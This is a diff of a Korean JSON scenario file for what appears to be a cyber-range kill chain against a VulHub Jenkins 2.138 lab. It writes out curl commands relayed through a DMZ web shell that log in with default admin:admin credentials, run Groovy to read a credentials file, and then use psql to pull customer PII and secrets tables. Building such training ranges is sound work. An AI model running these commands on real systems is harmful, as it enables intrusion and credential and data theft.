@@ -1,17 +1,17 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 ★ 내부→크라운 전 자격증명 탈취. Jenkins 2.138 미인증 스크립트 콘솔 RCE(CVE-2018-1000861) → Groovy 로 /opt/deploy/corp-db.properties 읽어 크라운 DB 자격증명 수집. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
+  "_note": "핵심층 환경 — corp 킬체인 ★ 내부→크라운 전 자격증명 탈취. Jenkins 2.138 VulHub 공식 교육 환경(기본 자격증명 admin:admin — init.groovy 가 createAccount 로 기본 생성) 스크립트 콘솔 Groovy 실행 → /opt/deploy/corp-db.properties 읽어 크라운 DB 접속정보 수집. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
   "env": "corp-jenkins-cred",
   "technique": "T1552.001",
   "cve": "CVE-2018-1000861",
   "procedure": {
     "id": "PROC-corp-jenkins-cred",
     "name": "Jenkins 스크립트 콘솔 RCE→DB 자격증명 탈취",
-    "description": "미인증 접근 가능한 Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔(CVE-2018-1000861)로 임의 Groovy 를 실행해 배포 파일 /opt/deploy/corp-db.properties 를 읽고 크라운 PostgreSQL 자격증명(postgres:postgres@postgres.corp-crown)을 수집한다. ★수집한 자격증명의 최종 용도는 postgres.corp-crown 에 직접 접속해 customers·ops_secrets 를 SELECT 하는 것(T1213 크라운)이다.",
+    "description": "Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔에 기본 자격증명(admin:admin — VulHub 공식 교육 환경)으로 접근해 임의 Groovy 를 실행, 배포 파일 /opt/deploy/corp-db.properties 를 읽고 크라운 PostgreSQL 접속정보(CORP_DB_USER=postgres, CORP_DB_PASS=postgres, CORP_DB_HOST=postgres.corp-crown.svc.cluster.local)를 수집한다. ★수집한 자격증명의 최종 용도는 postgres.corp-crown 에 직접 접속해 customers·ops_secrets 를 SELECT 하는 것(T1213 크라운)이다.",
     "status": "AUTHORED",
     "steps": [
       {"id": "STEP-corp-jenkins-groovy", "seq": 1,
-       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20%27http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2Fscript%27%20--data-urlencode%20%27script%3Dprintln%20new%20File%28%22%2Fopt%2Fdeploy%2Fcorp-db.properties%22%29.text%27'",
-       "description": "★ DMZ 웹셸(shell.jsp)을 중계로 Jenkins 스크립트 콘솔 Groovy 실행. ext 발판에서 jenkins.corp-internal 로 직접 치면 NetworkPolicy 차단으로 timeout — 반드시 DMZ RCE(STEP-corp-tomcat-exec 선행) 발판에서 중계. 응답에 'db.user=postgres', 'db.password=postgres' 같은 평문 크라운 DB 자격증명 노출. Groovy 로 임의 파일 읽기(CVE-2018-1000861)."},
+       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20%27http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2Fscript%27%20--data-urlencode%20%27script%3Dprintln%20new%20File%28%22%2Fopt%2Fdeploy%2Fcorp-db.properties%22%29.text%27'",
+       "description": "★ DMZ 웹셸(shell.jsp)을 중계로 Jenkins 스크립트 콘솔 Groovy 실행. ext 발판에서 jenkins.corp-internal 로 직접 치면 NetworkPolicy 차단으로 timeout — 반드시 DMZ RCE(STEP-corp-tomcat-exec 선행) 발판에서 중계. ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 자격증명 — init.groovy 가 admin:admin 계정 자동 생성·FullControlOnceLoggedIn 전략). 응답에 'CORP_DB_USER=postgres', 'CORP_DB_PASS=postgres', 'CORP_DB_HOST=postgres.corp-crown.svc.cluster.local' 같은 평문 크라운 DB 접속정보 노출 → step2 에서 이 값으로 crown 반출."},
       {"id": "STEP-corp-crown-select", "seq": 2,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=psql%20postgresql%3A%2F%2Fpostgres%3Apostgres%40postgres.corp-crown.svc.cluster.local%3A5432%2Fpostgres%20-c%20%27SELECT%20%2A%20FROM%20customers%20LIMIT%2010%27'",
        "description": "★ step1 에서 추출한 자격증명(postgres:postgres)으로 크라운 PostgreSQL 직접 접속 — 여전히 DMZ 웹셸 중계(internal→crown 은 NetworkPolicy 허용, ext→crown 은 차단). customers(PII)·ops_secrets 테이블 SELECT 로 크라운 반출 완료 — 이게 '진짜 flag' 다. T1213 Data from Information Repositories."}
@@ -19,8 +19,8 @@
   },
   "preconditions": [
     {"id": "PRE-corp-jenkins-console",
-     "name": "DMZ RCE 선행 + 미인증 스크립트 콘솔 + 배포파일 존재",
-     "description": "DMZ RCE(STEP-corp-tomcat-exec 등 웹셸 획득) 선행 필수 — ext→internal 은 NetworkPolicy 로 차단되므로 Jenkins 로 직접 못 감. DMZ RCE 발판을 중계로 Jenkins 스크립트 콘솔에 인증 없이 접근 가능하고, /opt/deploy/corp-db.properties 에 평문 크라운 DB 자격증명(postgres:postgres)이 보관됨."}
+     "name": "DMZ RCE 선행 + Jenkins 기본 자격증명(admin:admin) + 배포파일 존재",
+     "description": "DMZ RCE(STEP-corp-tomcat-exec 등 웹셸 획득) 선행 필수 — ext→internal 은 NetworkPolicy 로 차단되므로 Jenkins 로 직접 못 감. DMZ RCE 발판을 중계로 Jenkins 스크립트 콘솔 접근(VulHub 공식 이미지 기본 자격증명 admin:admin — init.groovy 가 createAccount 로 생성). /opt/deploy/corp-db.properties 에 평문 크라운 DB 접속정보(postgres:postgres@postgres.corp-crown)가 ConfigMap 마운트로 보관됨."}
   ],
   "expected_results": [
     {"id": "ER-corp-jenkins-progress-cred",
